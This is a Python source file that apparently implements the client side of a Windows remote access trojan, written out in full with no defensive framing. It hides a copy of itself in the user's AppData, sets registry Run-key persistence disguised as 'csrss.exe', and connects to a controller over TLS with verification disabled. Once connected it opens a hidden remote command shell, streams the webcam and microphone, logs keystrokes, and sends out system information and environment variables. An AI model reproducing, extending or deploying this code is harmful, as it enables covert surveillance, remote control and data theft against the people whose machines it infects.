import asyncio
import ssl
import os
import sys
import platform
import psutil
import subprocess
import cv2
import pyaudio
import shutil
import win32con
import win32api
import winreg
from pynput import keyboard

class Client:
    def __init__(self):
        self.IP = '192.168.0.10'
        self.PORT = 4747
        self.AUTOCON = False
        self.CONNECTED = False
        self.MIC = False
        self.COPY = False
        self.PWD = os.getcwd()
        self.frame = None 
        self.copy = False
        self.BuffSize = 100000000
        self.key_pressed = None
        self.status_keylogger = False
        self.new_path = 'C:\\Users\\BCC\\AppData\\Local\\Microsoft\\Edge\\User Data\\Autofill'
    async def UpdateInfoAndSend(self):
        self.OS_VER  = platform.platform()
        self.OS_NAME = platform.system()
        self.ARCH = platform.architecture()
        self.CPU_USAGE = psutil.cpu_percent()
        self.RAM = psutil.virtual_memory().total
        self.VARS = os.environ
        self.PWD = os.getcwd()
        self.USERS = psutil.users() 
        self.info = f'''
        OS        : {self.OS_NAME}
        OS_VER    : {self.OS_VER}
        ARCH      : {self.ARCH}
        CPU_USAGE : {self.CPU_USAGE}
        RAM       : {self.RAM}
        ENV       : {self.VARS}
        PWD       : {self.PWD}
        COPY      : {self.COPY}
        USERS     : {self.USERS}
        AUTCON    : {self.AUTOCON}
        '''
        self.writer.write(bytes(self.info,'utf-8'))
        await self.writer.drain()

    def start_client(self):
        #hidden .exe
        self.PWD = os.getcwd()
        file_name = os.path.basename(__file__)
        name, ext = os.path.splitext(file_name)
        current_file_path = self.PWD + '\\' + name + '.exe'

        try:
            shutil.copy(current_file_path, self.new_path)
            file_name = os.path.basename(__file__)
            name, ext = os.path.splitext(file_name)
            attr = win32api.GetFileAttributes(self.new_path + '\\' + name + '.exe')
            win32api.SetFileAttributes(self.new_path + '\\' + name + '.exe', attr | win32con.FILE_ATTRIBUTE_HIDDEN)
            self.COPY = True
        except:
            pass
        #run .exe
        asyncio.run(self.main())
    

    async def shell_session(self,reader, writer):

        startupinfo1 = subprocess.STARTUPINFO()
        startupinfo1.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo1.wShowWindow = subprocess.SW_HIDE
        process = await asyncio.create_subprocess_exec(
            *['cmd.exe'],
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            shell=False,
            startupinfo=startupinfo1
        )

        await asyncio.sleep(2)
        stdout = await process.stdout.read(self.BuffSize)
        writer.write(stdout)
        await writer.drain()

        while True:
            try:
                data = await reader.read(self.BuffSize)
            except:
                #close shell
                break
            #if is send a enter
            if data.decode() == 'ENTERCOMMAND':
                process.stdin.write(b'\r\n')
                await process.stdin.drain()
                try:
                    stdout = await asyncio.wait_for(process.stdout.read(self.BuffSize), timeout=5.0)
                    writer.write(stdout)
                    await writer.drain()
                except asyncio.TimeoutError:
                    pass
                stdout = ''
                continue
            
            #other stuff
            process.stdin.write(data + b'\r\n')
            await process.stdin.drain()
            await asyncio.sleep(2)
            if data.decode() == 'exit':
                writer.write(b'shell')
                await writer.drain()
                break
            try:
                stdout = await asyncio.wait_for(process.stdout.read(self.BuffSize), timeout=5.0)
                writer.write(stdout)
                await writer.drain()
            except asyncio.TimeoutError:
                pass
            try:
                stderr = await asyncio.wait_for(process.stderr.read(self.BuffSize), timeout=2.0)
                writer.write(stderr)
                await writer.drain()
            except asyncio.TimeoutError:
                pass
            stdout = ''
            stderr = ''
    def addStartup(self):  # this will add the file to the startup registry key
        try:
            file_name = os.path.basename(__file__)
            name, ext = os.path.splitext(file_name)
            new_file_path = self.new_path + '\\' + name + '.exe'
            keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
            key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0,winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key2change, 'csrss.exe', 0, winreg.REG_SZ,
                    new_file_path)
            self.writer.write(b'[+] Registers pwned')
            self.writer.drain()
            self.writer.write(bytes(new_file_path + ' in Software\Microsoft\Windows\CurrentVersion\Run','utf-8'))
        except:
            self.writer.write(b'[+] could not write to the registers for persistence')

    async def ConnectToServer(self):
        self.context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

        self.reader, self.writer = await asyncio.open_connection(self.IP, self.PORT, ssl=self.context)
        self.CONNECTED = True

    async def camera(self):
        data = None
        self.writer.write(b'init')
        await self.writer.drain()
        for i in range(10):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                while True:
                    try:
                        data = await asyncio.wait_for(self.reader.read(self.BuffSize), timeout=0.2)
                    except asyncio.TimeoutError:
                        data = None

                    if not data is None:
                        if data.decode(errors='ignore') == 'exit':
                            break

                    ret, frame = cap.read()
                    try:
                        ret, data = cv2.imencode(".jpg", frame)
                    except cv2.error:
                        self.writer.write(b'exit')
                        await self.writer.drain()
                        break
    
                    self.writer.write(len(data).to_bytes(4, 'big'))
                    await self.writer.drain()
                    data = data.tobytes()
                    self.writer.write(data)
                    await self.writer.drain()

                    if not ret:
                        self.writer.write(b'exit')
                        await self.writer.drain()
                        break

                cap.release()
                return
        self.writer.write(b'exit')
        await self.writer.drain() 
    
    async def microphone(self,reader, writer):
        CHUNK = 7024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        p = pyaudio.PyAudio()

        device_count = p.get_device_count()

        for i in range(device_count):
            device_info = p.get_device_info_by_index(i)
            if device_info["maxInputChannels"] > 0:
                self.MIC = True
                break
        
        if self.MIC:
            try:
                stream = p.open(
                    format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
            except:
                self.MIC = False
                writer.write(b'mic')
                await writer.drain()
                await asyncio.sleep(2)
                writer.write(b'[-] No microphones')
                await writer.drain()
                return
        else:
            writer.write(b'mic')
            await writer.drain()
            writer.write(b'[-] No microphones')
            await writer.drain()
            return

        while self.MIC:
            
            try:
                msg = await asyncio.wait_for(self.reader.read(self.BuffSize), timeout=0.1)
                stream.close()
                return
            except asyncio.TimeoutError:
                msg = None
            
            data = stream.read(CHUNK)
            writer.write(data)
            await writer.drain()

            
    def on_press(self,key):
        if self.status_keylogger == False:
            return False
        try:
            self.key_pressed = key.char
        except AttributeError:
            self.key_pressed = '{'+ str(key) + '}'
            
    async def main(self):
        while True:
            try:
                await self.ConnectToServer() #first connection
                break
            except:
                continue

        while True:
            try:
                while True:
                    if self.AUTOCON == True and self.CONNECTED == False:
                        while True:
                            try:
                                await self.ConnectToServer()
                                break
                            except:
                                pass
                        continue

                    data = await self.reader.read(1024)
                    if not data:
                        if self.AUTOCON == True:
                            self.CONNECTED = False
                            continue
                        else:
                            sys.exit()
                    data = data.decode()
                    if data == 'info':
                       self.UpdateInfoAndSend()
                    elif data == 'shell':
                        await self.shell_session(self.reader,self.writer)
                    elif data == 'camera':
                        await self.camera()
                    elif data == 'mic':
                        await self.microphone(self.reader,self.writer)
                    elif data == 'autocon':
                        if self.AUTOCON == False:
                            self.AUTOCON = True
                            self.writer.write(b'\n[+] AUTOCONNECTION TRUE')
                            await self.writer.drain()
                        else:
                            self.AUTOCON = False
                            self.writer.write(b'\n[+] AUTOCONNECTION FALSE')
                            await self.writer.drain()
                    elif data == 'keylogger':
                        self.status_keylogger = True

                        with keyboard.Listener(on_press=self.on_press) as listener:
                            while self.status_keylogger:
                                try:
                                    msg = await asyncio.wait_for(self.reader.read(self.BuffSize), timeout=0.1)
                                except asyncio.TimeoutError:
                                    msg = b'nothing'
                                if msg.decode(errors='ignore') == 'exit':
                                    self.status_keylogger = False
                                    self.writer.write(b'keylogger')
                                    await self.writer.drain()
                                    break
                                if not self.key_pressed is None:
                                    self.writer.write(bytes(str(self.key_pressed),'utf-8'))
                                    await self.writer.drain()
                                    self.key_pressed = None
                    elif data == 'persist':
                        self.addStartup()
                    else:
                        self.writer.write(b'\n[-] I do not know the command')
                        await self.writer.drain()
            except (KeyboardInterrupt, ConnectionResetError):
                self.writer.close()
                self.CONNECTED = False
                if self.AUTOCON == True:
                    continue
                return
        

client = Client()

client.start_client()

